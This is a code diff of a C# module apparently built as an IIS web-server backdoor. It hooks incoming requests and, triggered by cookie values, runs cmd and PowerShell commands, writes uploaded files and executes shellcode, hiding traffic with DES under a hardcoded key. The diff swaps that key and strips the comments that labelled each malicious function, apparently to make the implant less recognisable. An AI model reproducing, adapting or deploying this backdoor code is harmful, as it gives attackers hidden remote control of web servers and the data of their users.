@@ -15,62 +15,51 @@ namespace HttpManageMoudle
 {
     class DesString
     {
-        static string encryptKey = "jqkA";//字符串加密密钥(注意：密钥只能是4位)
-
+        static string encryptKey = "Base";
         public string Encrypt(string str)
-        {//加密字符串
-
+        {
             try
             {
-                byte[] key = Encoding.Unicode.GetBytes(encryptKey);//密钥
-                byte[] data = Encoding.Unicode.GetBytes(str);//待加密字符串
+                byte[] key = Encoding.Unicode.GetBytes(encryptKey);
+                byte[] data = Encoding.Unicode.GetBytes(str);
 
-                DESCryptoServiceProvider descsp = new DESCryptoServiceProvider();//加密、解密对象
-                MemoryStream MStream = new MemoryStream();//内存流对象
-
-                //用内存流实例化加密流对象
+                DESCryptoServiceProvider descsp = new DESCryptoServiceProvider();
+                MemoryStream MStream = new MemoryStream();
                 CryptoStream CStream = new CryptoStream(MStream, descsp.CreateEncryptor(key, key), CryptoStreamMode.Write);
-                CStream.Write(data, 0, data.Length);//向加密流中写入数据
-                CStream.FlushFinalBlock();//将数据压入基础流
-                byte[] temp = MStream.ToArray();//从内存流中获取字节序列
-                CStream.Close();//关闭加密流
-                MStream.Close();//关闭内存流
-
-                return Convert.ToBase64String(temp);//返回加密后的字符串
+                CStream.Write(data, 0, data.Length);
+                CStream.FlushFinalBlock();
+                byte[] temp = MStream.ToArray();
+                CStream.Close();
+                MStream.Close();
+                return Convert.ToBase64String(temp);
             }
             catch
             {
                 return str;
             }
         }
-
-
         public string Decrypt(string str)
-        {//解密字符串
+        {
             try
             {
-                byte[] key = Encoding.Unicode.GetBytes(encryptKey);//密钥
-                byte[] data = Convert.FromBase64String(str);//待解密字符串
+                byte[] key = Encoding.Unicode.GetBytes(encryptKey);
+                byte[] data = Convert.FromBase64String(str);
 
-                DESCryptoServiceProvider descsp = new DESCryptoServiceProvider();//加密、解密对象
-                MemoryStream MStream = new MemoryStream();//内存流对象
-
-                //用内存流实例化解密流对象
+                DESCryptoServiceProvider descsp = new DESCryptoServiceProvider();
+                MemoryStream MStream = new MemoryStream();
                 CryptoStream CStream = new CryptoStream(MStream, descsp.CreateDecryptor(key, key), CryptoStreamMode.Write);
-                CStream.Write(data, 0, data.Length);//向加密流中写入数据
-                CStream.FlushFinalBlock();//将数据压入基础流
-                byte[] temp = MStream.ToArray();//从内存流中获取字节序列
-                CStream.Close();//关闭加密流
-                MStream.Close();//关闭内存流
-
-                return Encoding.Unicode.GetString(temp);//返回解密后的字符串
+                CStream.Write(data, 0, data.Length);
+                CStream.FlushFinalBlock();
+                byte[] temp = MStream.ToArray();
+                CStream.Close();
+                MStream.Close();
+                return Encoding.Unicode.GetString(temp);
             }
             catch
             {
                 return str;
             }
         }
-
     }
 
     public static class Program
@@ -189,12 +178,6 @@ namespace HttpManageMoudle
             context.BeginRequest += new EventHandler(context_BeginRequest);
             
         }
-
-        /// <summary>
-        /// 执行cmd命令
-        /// </summary>
-        /// <param name="cmd"></param>
-        /// <returns></returns>
         public string RunCmd(string cmd)
         {
             DesString msg = new DesString();
@@ -216,20 +199,10 @@ namespace HttpManageMoudle
             outStr = msg.Encrypt(outStr);
             return outStr;
         }
-
-        /// <summary>
-        /// 执行powershell
-        /// </summary>
-        /// <param name="scriptText"></param>
-        /// <returns></returns>
         public static string Runpscmd(string pscmd)
         {
             DesString msg = new DesString();
-
-            // cmd = Encoding.UTF8.GetString(Convert.FromBase64String(demsg));
             pscmd = Encoding.UTF8.GetString(System.Text.Encoding.ASCII.GetBytes(msg.Decrypt(pscmd)));
-
-            //pscmd = Encoding.UTF8.GetString(Convert.FromBase64String(pscmd));
             Runspace runspace = RunspaceFactory.CreateRunspace();
             runspace.Open();
             Pipeline pipeline = runspace.CreatePipeline();
@@ -245,12 +218,6 @@ namespace HttpManageMoudle
             var outStr = msg.Encrypt(stringBuilder.ToString());
             return outStr;
         }
-        
-        /// <summary>
-        /// 上传文件
-        /// </summary>
-        /// <param name="base64"></param>
-        /// <returns></returns>
         public string upload_file(string base64)
         {
             string[] str = base64.Split('|');
@@ -259,12 +226,6 @@ namespace HttpManageMoudle
             System.IO.File.WriteAllText(str[1], decode, Encoding.UTF8);
             return "ok";
         }
-
-        /// <summary>
-        /// 执行shellcode
-        /// </summary>
-        /// <param name="base64"></param>
-        /// <returns></returns>
         public string shellcode(string base64)
         {
             string[] arr = base64.Split('|');
@@ -348,16 +309,7 @@ namespace HttpManageMoudle
                     context.Response.End();
                     context.Response.Close();
                 }
-                /*else if (MyCookie.Name.Equals("UPBDUSS"))
-                {
-                    String cookie = MyCookie.Value;
-                    context.Response.Clear();
-                    context.Response.Write(upload_file(cookie));
-                    context.Response.End();
-                    context.Response.Close();
-                }*/
             }
-
         }
         public void Dispose()
         {
